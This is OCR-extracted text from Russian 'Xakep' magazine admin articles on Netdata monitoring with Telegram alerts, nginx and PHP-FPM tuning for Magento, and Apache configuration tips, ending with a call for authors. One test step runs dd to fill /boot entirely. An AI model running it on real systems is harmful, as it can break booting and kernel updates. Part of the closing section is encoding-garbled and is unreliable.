         # this chat id (empty = do not send a notification for unconfigured roles):

   Чтобы проверить, доставляются ли уведомления в нужный канал Telegram,
используй следующий скрипт:


# Смена текущего пользователя xakep на netdata
$ sudo su -s /bin/bash netdata


# Включение вывода отладки в терминал
$ export NETDATA_ALARM_NOTIFY_DEBUG= 1


# Отправка тестового уведомления группе sysadmin
$ /usr/libexec/netdata/plugins.d/alarm-notify.sh test

В результате проверки мы увидим, что уведомления в Telegram в нужном
канале успешно получены.





                   Результат проверки уведомлений из Netdata


Проверка уведомлений на события в Netdata
Проверить доступные события, по которым ты сможешь получать уведом‐
ления, можно в веб‑интерфейсе агента Netdata по адресу 127.0.0.1:19999.
Здесь используется порт 19999, для которого мы уже устанавливали туннель
SSH.





       Список активных проверок и уведомлений (тригеров) в Netdata

Давай проведем тестирование на триггере по доступному месту в разделе
/boot, записав в этот раздел файл максимально возможного размера:



  # Проверь занятое пространство /boot — занято менее 30%
  [xakep@netdata ~]$ df -h /boot
  Filesystem           Size  Used Avail Use% Mounted on
  /dev/nvme0n1p2      1014M  254M  761M  26% /boot


  # Командой dd создай максимального размера файл в /boot
  [xakep@netdata ~]$ sudo dd if=/dev/urandom of=/boot/delete_me
  dd: writing to '/boot/delete_me': No space left on device
  1556449+0 records in
  1556448+0 records out
  796901376 bytes (797 MB, 760 MiB) copied, 5.18328 s, 154 MB/s


  # Снова проверь занятое пространство /boot — занято 100%
  [xakep@netdata ~]$ df -h /boot
  Filesystem           Size  Used Avail Use% Mounted on
  /dev/nvme0n1p2      1014M 1014M   20K 100% /boot


Проверь текущие  триггеры  в  оповещениях  в  веб‑интерфейсе  Netdata.
Для  этого предусмотрен  значок колокольчика  вверху справа и  вкладка
активных алармов.





                      Активированные триггеры в Netdata





                      Активированные триггеры в Netdata

Есть уведомление в Telegram. Перед снятием скриншота я уже удалил файл
/boot/delete_me, поэтому последнее уведомление указывает на то, что
проблема устранена и зафиксировано событие recovered.





         Полученные уведомления о триггерах в Telegram из Netdata




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИАДМИН
            NETDATA

              НАСТРАИВАЕМ ПРОСТУЮ БЕСПЛАТНУЮ
                       СИСТЕМУ МОНИТОРИНГА





СБОР СТАТИСТИКИ ПО СЕРВИСАМ И ПОЛЬЗОВАТЕЛЯМ
Одна из ключевых, на мой взгляд, особенностей Netdata — возможность
собирать  статистику используемых ресурсов по пользователям, группам
и сервисам. Проверим, как работает эта функция, какие данные собирает
агент и как выглядит статистика.
  Для начала установим сервер баз данных NoSQL — Redis:


$ sudo yum install redis -y
$ sudo systemctl start redis

Заполним БД массивом данных:



  [xakep@netdata ~]$ redis-cli
  127.0.0.1:6379> KEYS *
  (empty list or set)
  127.0.0.1:6379> DEBUG POPULATE 2000 test 1000000
  OK
  (0.81s)
  127.0.0.1:6379> KEYS *
     1) "test:1939"
     2) "test:1815"
     3) "test:1686"
     4) "test:778"
  ...
  1997) "test:1240"
  1998) "test:814"
  1999) "test:1379"
  2000) "test:267"


Не забываем перезапустить агент Netdata:


$ sudo systemctl restart netdata.service

При рестарте Netdata запустит плагин для мониторинга Redis. Дополнитель‐
ной настройки не требуется.


Статистика по сервисам/процессам
Вот так выглядит статистика по потреблению ресурсов CPU, операциям вво‐
да‑вывода (input/output) приложениями и процессами.





                       Статистика по сервисам — CPU, IO

Потребление оперативной памяти (RAM), количество запущенных процессов
и потоков приложениями и процессами.





   Статистика по сервисам — оперативная память, запущенные процессы,
  потоки

Потребление swap, использование сети, количество открытых сокетов.





                      Статистика по сервисам — swap, сеть


Статистика по пользователям
Потребление ресурсов CPU, операции ввода‑вывода, выполненные поль‐
зователями.





               Статистика по пользователям — CPU, ввод‑вывод

Использование swap, использование сети, количество открытых пользовате‐
лями сокетов.





     Статистика по сервисам — запущенные процессы, потоки, swap, сеть

Наполнение данными БД Redis ожидаемо вызвало потребление ресурсов
виртуальной машины. Это привело к исчерпанию доступной оперативной
памяти и дополнительно использовало swap. Об этом нас тут же уведомил
агент Netdata в Telegram.





              Оповещения Netdata вследствие нагрузки Redis

Остановка сервиса Redis возвращает потребление ресурсов в обычное сос‐
тояние, об этом также приходит уведомление в Telegram.





              Устраненные триггеры и фиксация восстановления

На   скриншоте  выше   видно,   что   критическое   событие   go.d.
job_last_collected_secs не перешло в recovered. Это остановленный
нами сервер Redis.
   Теперь посмотрим, что у нас на дашбордах. На локальном дашборде один
активный триггер — недоступность Redis-сервера.





               Триггер по недоступности Redis все еще активен

В Netdata Cloud — тот же триггер.





               Триггер по недоступности Redis все еще активен

Если мы не планируем далее использовать Redis на этом хосте, достаточно
перезапустить Netdata, чтобы плагин go.d/redis был выгружен. Поскольку
БД Redis не запущена, то и плагин не подгрузится, если его конфигурация
не определена явно в /etc/netdata/.





                            Триггера больше нет





                            Триггера больше нет


ВЫВОДЫ
Мы рассмотрели настройку и принцип работы очень удобного, а главное —
бесплатного инструмента мониторинга. Этот инструмент можно использовать
не только на нагруженных серверах, но и в виртуальных машинах, на роутерах
и одноплатных компьютерах. Netdata обладает большим набором функций,
который легко расширяется с использованием плагинов. И хотя этот инстру‐
мент требует определенной настройки (как, впрочем, и любой другой инстру‐
мент мониторинга для Linux), его возможностей должно с лихвой хватить
для решения большинства типичных задач.
АДМИН
MAGENTНАЯ
 АНОМАЛИЯ





         НАСТРАИВАЕМ NGNIX
       ДЛЯ РАБОТЫ С MAGENTO




По  настройке  сервера  nginx  созданы
тысячи  мануалов,  но  иногда  случаются
ситуации,  не  описанные  ни  в  одном
руководстве. Предпосылкой для этой пуб‐
ликации послужила вовсе не моя предыду‐      Денис Колисниченко                                                                                 Постоянный автор журнала
щая статья про «Апач», а реальный кейс:                «Хакер»                                                                                            dhsilabs@gmail.com
на VDS с 39 Гбайт оперативки nginx кушал
всю память, после чего сайт «ложился».
Как  мне  удалось  справиться  с  этой
напастью, я сейчас расскажу.


ВКРАТЦЕ О СЕРВЕРЕ
Итак, имеем самый обычный VDS с 39 Гбайт оперативки, 12 ядрами и «Убун‐
той» на борту. PHP 7.2, PHP-FPM, MySQL 5.7. Версии ПО, может, немного
и древние, но установлены неспроста: такая конфигурация обусловлена тре‐
бованиями CMS Magento  2.3.4. Более новая версия PHP повлекла бы
за собой обновление версии CMS, а этого по ряду причин делать было нель‐
зя.
   Как обычно, все прекрасно работало до одного момента: пока не начались
традиционные новогодние распродажи и маркетологи не притащили на сайт
кучу трафика. Вот тут и начались проблемы. Наиболее характерная из них —
процесс php-fpm в паре с MySQL выжирал всю оперативку. Перезапуск сер‐
висов с добавлением 20 Гбайт свопа проблему решил ненадолго. Дальше
пошел процесс настройки nginx и php-fpm, прежде всего — последнего, пос‐
кольку именно его параметры влияют на эксплуатационные особенности
CMS. Я не буду  рассматривать  установку и  настройку  nginx с самого
начала — скорее всего, у тебя уже все настроено. Даже если это не так,
в сети можно найти множество статей и руководств на эту тему. Сконцентри‐
руемся лучше на параметрах, непосредственно влияющих на производитель‐
ность сервера.


КОНФИГУРАЦИОННЫЕ ФАЙЛЫ
Прежде чем приступить к дальнейшему чтению статьи, нужно понимать, что
и где и редактировать. Конфигурация nginx хранится в каталоге /etc/nginx.
Основной конфиг — nginx.conf, но времена одного большого файла уже
давно прошли, и в зависимости от содержимого nginx.conf конфигурация
веб‑сервера может быть разбросана по всей файловой системе.
   Как правило, конфиги сайтов хранятся в каталоге /etc/nginx/conf.d.
Для каждого сайта принято создавать отдельный конфиг. Далее нужно про‐
анализировать содержимое файлов конфигурации на предмет директивы
Include. Если первоначальную настройку выполнял не ты, поищи во всех
файлах каталога nginx файлы с директивой Include — так ты поймешь, что
и откуда берется. Например, в моем случае кто‑то до меня добавил дирек‐
тиву include /var/www/www/nginx.conf, чтобы некоторые параметры мож‐
но было вынести в каталог документов веб‑сервера и редактировать их
без  редактирования  основной  конфигурации  сервера.  Что‑то  вроде
.htaccess в «Апаче», вот только после изменения этого файла все равно
придется делать reload сервису.
   Далее перейдем к параметрам PHP. У него есть несколько конфигураций.
Прежде всего введи команду php –v, чтобы выяснить номер версии. Так вот,
конфигурация  твоей версии PHP  хранится в  каталоге /etc/php/<номер
версии>. В этом каталоге ты найдешь четыре подкаталога. Да, это три разные
конфигурации и список модулей:
 • apache2 — конфиг для модуля mod_rewrite «Апача». Если у тебя «Апач», то
   настройки PHP хранятся здесь;
 •  cli — параметры консольной версии PHP, они вступают в силу, если ты
   запускаешь    выполнение     скрипта    с     консоли    командой
  php <имя_скрипта>;
 • fpm — наш случай, а именно конфигурация сервиса php-fpm и самого
   PHP, работающего в связке nginx, PHP-FPM и PHP;
 • mods-available — доступные расширения PHP. Здесь хранятся .ini-файлы,
   по одному для каждого установленного расширения. Закомментировав
   строчку extension внутри  этого файла, ты можешь выключить рас‐
   ширение.

Чтобы узнать, какой именно файл конфигурации PHP используется, помести
в корень  сервера PHP-скрипт, вызывающий php_info(). Эта  функция
и покажет (кроме всего прочего) локацию и имя файла конфигурации.


ВКЛЮЧЕНИЕ HTTP 2.0
Если не считать статического кеша, то самое крутое, что ты можешь сделать
в настройках nginx, — это включить HTTP 2.0. Некоторые админы почему‑то
забывают об этом. В моем случае так и было: я уже получил преднастроенный
подрядчиком сервер, в котором почему‑то забыли включить версию 2.0 про‐
токола HTTP. Думаю, не нужно говорить о том, как медленно работала
Magento.
   Больше дела, меньше слов: открой конфигурацию сайта в каталоге /etc/
nginx/conf.d/<имя_сайта>.conf. Найди блок server и добавь (если этого
еще не сделано) http2 в директиву listen. Должно получиться так:


server {
    listen 443 ssl http2 ;
    ssl on ;
    ...
}

Номер порта и SSL установи по своему усмотрению, но поскольку пример
реальный, то SSL уже есть на твоем сайте, так как это стандарт по умолчанию.


OPCACHE: БЫТЬ ИЛИ НЕ БЫТЬ?
OPcache используется для кеширования скомпилированного байт‑кода PHP-
скриптов в оперативной памяти. С одной стороны, при использовании
OPcache повысится производительность и снизится нагрузка на сервер —
PHP уже не будет создавать байт‑код при выполнении скрипта, а станет
использовать откомпилированную версию из кеша. С другой стороны, в про‐
цессе использования сложных CMS вроде Magento могут возникнуть проб‐
лемы. При установке расширения этого движка происходит так называемая
перекомпиляция Magento. Лучше эту процедуру производить при выключен‐
ном кеше, а затем снова его включить.
  Для этого редактируется конфиг, перезагружается сервис php-fpm, про‐
изводятся необходимые действия, а потом снова все повторяется — редак‐
тирование  конфига и  перезапуск  сервиса.  Также  возникнут проблемы
при использовании  собственной системы кеширования Magento. Здесь
поможет использование Varnish. В общем, резюмировать можно следующее:
если ты решишь включить OPcache, то в случае с Magento тебе придется
отказаться от использования собственной системы кеширования и раз‐
бираться с настройками Varnish. Установка расширений доставляет меньше
неудобств, поскольку выполняется не так часто.
  Для включения OPcache нужно открыть конфигурацию PHP, в нашем случае
это /etc/php/7.2/fpm/php.ini, и добавить в него всего одну строчку:


opcache.enable = 1

Этим ты активируешь opcache с настройками по умолчанию. Как минимум
можно задать параметр opcache.memory_consumption, который регулирует
размер памяти (в мегабайтах), выделяемый для OPcache. Значение по умол‐
чанию — 128, минимально допустимое значение — 8:


opcache.memory_consumption = 256

С остальными настройками OPcache можно ознакомиться здесь. На своем
сервере я отключил OPcache по двум причинам. Во‑первых, сайт активно
допиливается, из‑за чего очень часто приходится добавлять в него новые
функции или изменять уже имеющиеся, что при включенном OPcache не сов‐
сем удобно. Во‑вторых, пока нет никакого желания устанавливать Varnish,
хотя в скором времени это придется сделать. На данный момент использует‐
ся штатная система кеширования.


ЗАПРЕЩАЕМ ДОСТУП БОТОВ
Боты во время  своего обхода  сайта  расходуют  драгоценные  ресурсы.
При  неблагоприятном  стечении  обстоятельств  (например,  случайные
или  намеренные  визиты  нескольких  ботов  сразу)  сайт может  упасть,
не выдержав нагрузки. Каждый GET-запрос страницы тянет за собой исполь‐
зование ресурсов сервера: загрузка элементов страницы (картинки, CSS-
таблицы и прочее), обращение к базе данных и, возможно, к сторонним
ресурсам. Бот — это не пользователь, который откроет одну страницу и изу‐
чает ее контент, бот открывает страницу за страницей, что может вызвать
негативные последствия.
  К сожалению, не все боты читают содержимое robots.txt. Избавиться
от ботов можно в конфиге nginx. Открой файл конфигурации твоего сайта,
отыщи блок server и добавь в него следующие строки:


if ($http_user_agent ~* SemrushBot|semrush|PetalBot |petalbot |MJ12Bot|
AhrefsBot |bingbot|DotBot|LinkpadBot|SputnikBot|statdom.ru |
WebDataStats |Jooblebot |Baiduspider|openstat .ru ) {
    return 403;
}

Думаю, смысл этих строк понятен всем: мы смотрим на http_user_agent
и если агент пользователя содержит одну из запрещенных строк, возвра‐
щаем ошибку 403. Это не весь список ботов, ты можешь дополнить его.
Узнать имя бота можно из access.log — в логе сохраняется вся нужная
инфа.


КАСТОМНАЯ MAINTENANCE-СТРАНИЦА ДЛЯ «МАДЖЕНТЫ»
При переводе в режим обслуживания Magento отображает непримечатель‐
ное сообщение о том, что сайт закрыт. Выглядит очень непрезентабельно.
Мы можем создать кастомную страницу, которая будет отображаться, когда
сайт закрыт на обслуживание. Просто добавь в конфиг твоего сайта сле‐
дующие строки (внутри блока server):


set $MAGE_ROOT /var/www/www;
set $maintenance off;
if (-f $MAGE_ROOT /maintenance.enable) {
    set $maintenance on ;
}
if ($remote_addr ~ (188.xx .yy .zz |188.aa .bb .cc )) {
    set $maintenance off;
}
if ($maintenance = on ) {
    return 503;
}
location /maintenance {
}
error_page 503 @maintenance;
location @maintenance {
    root $MAGE_ROOT ;
    rewrite ^(.*)$ /maintenance.html break ;
}

Работать будет так:
 • переменная $MAGE_ROOT устанавливает каталог, в котором установлено
   приложение;
 • по умолчанию режим обслуживания выключен — set  $maintenance
  off;
 • режим обслуживания включается, если в корневом каталоге приложения
   есть файл maintenance.enable;
 • режим обслуживания не работает для IP-адресов 188.xx.yy.zz и 188.
  aa.bb.cc. Здесь ты можешь указать свои адреса;
 • если   режим   обслуживания   включен,    возвращается   страница
  maintenance.html, находящаяся в корне (MAGE_ROOT). Именно сюда
   следует поместить страничку с нужным текстом и оформлением. Офор‐
   мление (CSS) лучше расположить внутри этого файла, как и картинки
   (в SVG), — сайт в режиме обслуживания должен минимально нагружать
   сервер.


НАСТРОЙКА ПУЛА WWW
Теперь перейдем к опциям PHP-FPM. Как правило, значимые параметры хра‐
нятся в конфиге пула — в каталоге /etc/php/версия/fpm/pool.d/. В нем
есть один или несколько конфигов. Далее приведен пример моего файла:


[www]
user = www-data
group = www-data
listen = /var/run/php/php7.2-fpm.sock
listen.owner = www-data
listen.group = www-data
php_admin_value[disable_functions] = exec,passthru,shell_exec,system
php_admin_flag[allow_url_fopen] = on
php_value[max_input_vars] = 300000
pm = dynamic
pm.max_children = 259
pm.start_servers = 48
pm.min_spare_servers = 24
pm.max_spare_servers = 248
pm.max_requests = 2000
request_terminate_timeout = 6000
php_admin_value[memory_limit] = 8192M
chdir = /
slowlog=/var/log/php-slow.log
request_slowlog_timeout=30s

Не нужно слепо копировать все значения — они установлены для моего сер‐
вера и на твоем могут сделать только хуже. Попробуем разобраться, что
к чему.
   Параметры, которые непосредственно влияют на производительность,
начинаются с pm. В большинстве случаев используется динамическая кон‐
фигурация (pm = dynamic), при которой количество процессов PHP-FPM
меняется динамически, в зависимости от количества запросов. При этом
имеется минимальное  количество  процессов, которые  будут  запущены
при старте FPM-сервиса. Остальные параметры трактуются так:
 • pm.max_children — максимальное количество дочерних процессов,
   которые будут созданы, по сути это максимальное количество запросов,
   которые может обслужить пул. Аналог ApacheMaxClients для «Апача»;
 • pm.start_servers — число дочерних процессов, которые будут соз‐
   даны при запуске пула, используется только в динамической конфигура‐
   ции;
 • pm.min_spare_servers — минимальное количество дочерних процес‐
   сов в статусе Idle;
 • pm.max_spare_servers — максимальное количество дочерних процес‐
   сов в статусе Idle;
 • pm.max_requests — максимальное количество запросов, которое дол‐
  жен обработать процесс FPM перед его перезапуском (помогает избе‐
   жать утечек памяти). Здесь нужно экспериментировать, для кого‑то подой‐
   дет значение 1000, для кого‑то значение нужно увеличивать.

Можно экспериментировать с этими значениями вручную, а можно восполь‐
зоваться скриптом php_settings.sh. На всякий случай код скрипта:


#!/usr/bin/env bash
if [[ -z ${1} ]] || [[ -z ${2} ]]; then
  echo -e "Run script: ./php_settings.sh <Memory size MB> <PHP-FPM
version>\n./php_settings.sh 1024 7.4"
  exit 1
fi


_php_version=${2}
_cpu_cores=$(( $(lscpu | awk '/^Socket/{ print $2 }') * $(lscpu | awk
'/^Core/{ print $4 }') ))
_mem_usage=${1}
_average_proc_mem=$( ps --no-headers -o "rss,cmd" -C php-fpm${
_php_version} | awk '{ sum+=$1 } END { printf ("%d\n", sum/NR/1024) }
')


echo -e "average_proc_mem=${_average_proc_mem}\n#################"
echo pm.max_children=$(awk "BEGIN { printf ${_mem_usage} / ${
_average_proc_mem} }")
echo pm.start_servers=$(awk "BEGIN { printf ${_cpu_cores} * 4 }")
echo pm.min_spare_servers=$(awk "BEGIN { printf ${_cpu_cores} * 2 }")
echo pm.max_spare_servers=$(awk "BEGIN { printf ${_cpu_cores} * 4 }")

Использовать скрипт просто: задаешь объем (в мегабайтах) оперативки
и версию PHP, затем получаешь строки, которые нужно скопировать в www.
conf (конфигурация пула). Используя код скрипта, можно все посчитать
и вручную, однако автоматизация еще никогда не мешала. Вывод скрипта
может быть таким:


average_proc_mem=159
#################
pm.max_children=251.17
pm.start_servers=48
pm.min_spare_servers=24
pm.max_spare_servers=48

В конфиг нужно скопировать не все, а только строки после ###. Первая стро‐
ка намекает на примерный объем процесса, который у тебя должен получить‐
ся. Если max_children не целое число, его можно округлить до ближайшего
целого.





                          Использование скрипта

С приведенными настройками сервак был перезагружен (перезагружать
вообще не нужно было, но для чистоты эксперимента это необходимо). Спус‐
тя  девять  часов работы  в  обычном режиме  расход памяти не  пре‐
высил 11 Гбайт, что не может не радовать.





            Потребление ресурсов после настройки параметров

Также не забудь включить slow-лог:


slowlog=/var/log/php-slow.log
request_slowlog_timeout=30s

Если какой‑то скрипт выполняется больше 30 секунд, то инфа о нем будет
помещена в файл /var/log/php-slow.log. Это поможет при выявлении
узких мест на сайте.


ВЫВОДЫ
По большому счету каждая CMS имеет свои индивидуальные особенности
и может потребовать собственных настроек сервера. Для Magento оптималь‐
ная конфигурация nginx описана в этой публикации. Статья хоть и не раскры‐
вает всех тонкостей настройки nginx, однако приведенных в ней инструкций
вполне достаточно, чтобы сделать существенно «лучше, чем было».
АДМИН





                                                                      Денис Колисниченко
                                                                               Постоянный автор журналаПУТЬ
                                                                                               «Хакер»
                                                                                         dhsilabs@gmail.com
ИНДЕЙЦА





           НЕТРИВИАЛЬНАЯ НАСТРОЙКА
                     СЕРВЕРА APACHE





Мнения относительно Apache разнятся. Кто‑то считает его
рухлядью на фоне продвинутого и более молодого Nginx,
кто‑то до сих пор использует в качестве привычного инстру‐
мента. Эта статья — не просто мануал (коих в Сети — море)
по конфигурации веб‑сервера, в ней мы рассмотрим нас‐
тройку  «фишек», которые любой админ  сможет  смело
положить в копилку собственного опыта.


РАБОТА СЕРВЕРА НА НЕСКОЛЬКИХ ПОРТАХ
Как правило, при настройке SSL/HTTPS веб‑сервер слушает порт 80 или 443.
Но в некоторых сложных конфигурациях нужно, чтобы он слушал несколько
портов. Далее будет показано, как разместить на одном сервере три незави‐
симых приложения, каждое из которых будет работать на собственном пор‐
те — 80, 3128 и 8080. На практике такая конфигурация не редкость в dev-сре‐
дах, где есть потребность в размещении нескольких независимых приложе‐
ний на одном сервере (не арендовать же для этого сразу несколько сер‐
веров?).
   Первым делом нужно отредактировать файл /etc/apache2/ports.conf
и задать порты, которые будет слушать сервер (по одному порту в строчке):


Listen 80
Listen 3128
Listen 8080

Далее нужно создать конфигурацию для каждого приложения (для каждого
порта). Ты можешь использовать разные файлы конфигурации, а можешь
поместить все настройки в один файл — как больше нравится. Вот листинг,
где все настройки хранятся в одном большом файле (чтобы не делать три
разных листинга).


Файл /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80 >
    DocumentRoot    /var/www/landing


    <Directory /var/www/landing>
        Options -Indexes
        AllowOverride All


        # Apache 2.4.x
        <IfModule mod_authz_core.c >
            Require all granted
        </IfModule >
    </Directory >


    CustomLog   /var/log/apache2/landing.access.log "Combined"
    ErrorLog    /var/log/apache2/landing.error .log
</VirtualHost>


<VirtualHost *:3128 >
    DocumentRoot    /var/www/sonerezh


    <Directory /var/www/sonerezh >
        Options -Indexes
        AllowOverride All


        # Apache 2.4.x
        <IfModule mod_authz_core.c >
            Require all granted
        </IfModule >
    </Directory >


    CustomLog   /var/log/apache2/demo .sonerezh .bzh-access.log
"Combined"
    ErrorLog    /var/log/apache2/demo .sonerezh .bzh-error .log
</VirtualHost>


<VirtualHost *:8080 >
    DocumentRoot    /var/www/sonerezh -ru


    <Directory /var/www/sonerezh -ru >
        Options -Indexes
        AllowOverride All


        # Apache 2.4.x
        <IfModule mod_authz_core.c >
            Require all granted
        </IfModule >
    </Directory >


    CustomLog   /var/log/apache2/demo .sonerezh .ru -access.log
"Combined"
    ErrorLog    /var/log/apache2/demo .sonerezh .ru -error .log
</VirtualHost>

Принцип следующий: мы указываем номер порта в директиве VirtualHost,
а затем готовим разную конфигурацию для разных узлов. После настройки
нужно не забыть рестартануть апач (sudo systemctl restart  apache2),
а затем обращаться к каждому приложению можно так:


http://IP:номер порта


ДИНАМИЧЕСКИЕ ПОДДОМЕНЫ
Часто   для   одного   домена    создаются   поддомены   (например,
sales.example.com или support.example.com). Поддомены настраиваются c
использованием директивы VirtualHost. Но если поддоменов много, то
тебе быстро надоест создавать отдельный конфигурационный файл для каж‐
дого из них. Гораздо проще использовать следующую конфигурацию:


Динамические поддомены
<VirtualHost *:80 >
        ServerAdmin  site @example.com
        ServerName   example.com
        ServerAlias  www.example.com
        DocumentRoot /var/www/example.com/htdocs


        ErrorLog ${APACHE_LOG_DIR}/error .log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


<VirtualHost *:80 >
        ServerAdmin site @example.com
        ServerName example.com
        ServerAlias *.example.com


        UseCanonicalName Off
        VirtualDocumentRoot /var/www/example.com/%-3


        ErrorLog ${APACHE_LOG_DIR}/error .log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

Все поддомены будут запрашиваться из подкаталогов каталога /var/www/
example.com. Для работы данной конфигурации нужно, чтобы mod_rewrite
был установлен и активирован. Также нужно, чтобы DNS-сервер знал о под‐
домене. Другими словами, мало создать папку test в /var/www/example.
com. Нужно, чтобы DNS-сервер знал, где искать поддомен test.example.com.


ВСЕ НОВОЕ — ХОРОШО ЗАБЫТОЕ СТАРОЕ, ИЛИ
ПОЛЬЗОВАТЕЛЬСКИЕ КАТАЛОГИ
Пользователям, заставшим 2000-е, хорошо знакома следующая схема URL:
имя_сайта/~имя_юзера. Раньше такая запись часто использовалась на все‐
возможных бесплатных хостингах вроде narod.ru. Никто не заморачивался
с поддоменами, просто создавался каталог, в который помещались файлы
пользователя. В случае если тебе вдруг понадобилось предоставить поль‐
зователям место под их личный сайт, можно реализовать такой же механизм
пользовательских каталогов посредством директивы UserDir. По умолчанию
директива UserDir отключена:


UserDir disabled

Включить ее можно, указав вместо disabled любое другое значение — обыч‐
но указывается значение public_html:


UserDir public_html

Затем  в  пользовательском  каталоге  /home/<имя>  создается  каталог
public_html и в него помещаются HTML/PHP-файлы персонального сайта
пользователя. Обращение к сайту пользователя происходит по URL:


http://имя_сервера/~имя_пользователя

Например, если при включенной директиве UserDir ты поместил в каталог
/home/den/public_html файл report.xml, то обратиться к нему можно
по адресу http://server/~den/report.xml.
   Ранее, в доисторические времена, достаточно было раскомментировать
эту директиву в конфигурационном файле. Сейчас, когда конфигурация сер‐
вера состоит из нескольких небольших файлов, добавление этой опции
в основной конфиг не приводит ни к каким изменениям. Опцию UserDir нуж‐
но добавить (точнее, просто раскомментировать) в файле /etc/apache2/
mod_userdir.conf. А затем добавить следующую строку в самый конец фай‐
ла /etc/apache2/default-server.conf:


Include /etc/apache2/mod_userdir.conf

После всего этого следует перезапустить апач.


УСКОРЯЕМСЯ С ПОМОЩЬЮ PAGESPEED И MEMCACHED
Ускорить работу запущенного под управлением Апача веб‑приложения мож‐
но посредством PageSpeed и Memcached. Систему кеширования нужно
выбирать, исходя из самого приложения. Например, для некоторых из них
(вроде Magento 2) рекомендуется использовать Varnish, но Varnish сложен
в настройке, хотя и позволяет добиться неплохих результатов. Начнем с уста‐
новки Google PageSpeed:


cd /tmp
wget https://dl-ssl.google.com/dl/linux/direct/mod-pagespeed-stable_
current_amd64.deb
sudo dpkg -i mod-pagespeed-stable_current_amd64.deb

После этого нужно установить Memcached. Он доступен из репозиториев
Ubuntu:


sudo apt install memcached

Установив демон, нужно узнать порт, на котором он работает. Введи команду


netstat -tap | grep memcached

Порт будет выведен после слова localhost — например: localhost:11211.
Это стандартный порт для Memcached, который нужно указать в конфигура‐
ции модуля mod_pagespeed.
  Для ускорения PHP-приложений следует установить пакет php-memcached:


sudo apt install php-memcached

Осталось  настроить  модуль  mod_pagespeed  на  работу  с  помощью
Memcached.  Для  этого  открой  файл  /etc/apache2/mods-available/
pagespeed.conf:


mcedit /etc/apache2/mods-available/pagespeed.conf

Выполни поиск по строке: ModPagespeedMemcachedServers. Раскомментируй
строку:


# ModPagespeedMemcachedServers localhost :11211

Она должна быть такой:


ModPagespeedMemcachedServers localhost :11211

Перезапусти Apache:


sudo systemctl restart apache2

Теперь твой сайт будет работать немного быстрее. Для более тонкой нас‐
тройки обратись к документации по Memcached.


ПРОТОКОЛИРОВАНИЕ POST-ЗАПРОСОВ
Как все мы знаем, HTTP-запросы бывают двух типов: GET и POST. С логиро‐
ванием GET-запросов никаких проблем не возникает — все они заносятся
в файл access.log. А вот что с POST-запросами? Как мы узнаем, какой поль‐
зователь обращался с помощью POST к нашим сценариям и какие данные
передавал? В этом нам поможет модуль modsecurity.
   Возможности у modsecurity весьма широки, но нас интересует сейчас
только логирование POST-запросов, на этом и  остановимся.  Установи
modsecurity:


sudo apt install libapache2-modsecurity

Скопируй файл  конфигурации  с  рекомендуемыми  параметрами,  чтобы
использовать его в качестве основного файла конфигурации:


cd /etc/modsecurity/
sudo cp modsecurity.conf-recomended modsecurity.conf

Открой файл /etc/modsecurity/modsecurity.conf для редактирования:


sudo mcedit /etc/modsecurity/modsecurity.conf

Добавь в него следующие строки:


SecRequestBodyAccess On
SecRule REQUEST_METHOD "POST" "id:200012,phase:2,ctl:auditEngine=On,
log,pass"

При желании можно настроить и другие параметры этого модуля — обратись
к соответствующей документации (ее без проблем можно найти в интернете).
Перезапусти Apache:


sudo systemctl restart apache2

Файл журнала modsecurity называется /var/log/apache2/modsec_audit.
log. Если на сервере работает несколько сайтов, то соответствующую нас‐
тройку нужно выполнить для каждого отдельного виртуального узла. Открой
файл конфигурации виртуального узла и добавь строки:


<IfModule security2_module >
        SecAuditLog /var/log/apache2/audit_example_com.log
        SecRule REQUEST_METHOD "POST" "id:22222224,phase:2,ctl:
auditEngine=On,log,pass"
        SecRuleEngine On
</IfModule >

Безусловно,  веб‑сервер Apache  имеет  гораздо  больше  возможностей
для тонкой настройки и тюнинга, но все они довольно подробно описаны
в официальной документации. Эти несколько полезных приемов помогут тебе
быстро настроить нужные функции Apache, если ты привык пользоваться
именно этим продуктом или под рукой нет другого веб‑сервера. В сле‐
дующей статье мы попробуем твикнуть твой любимый Nginx.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
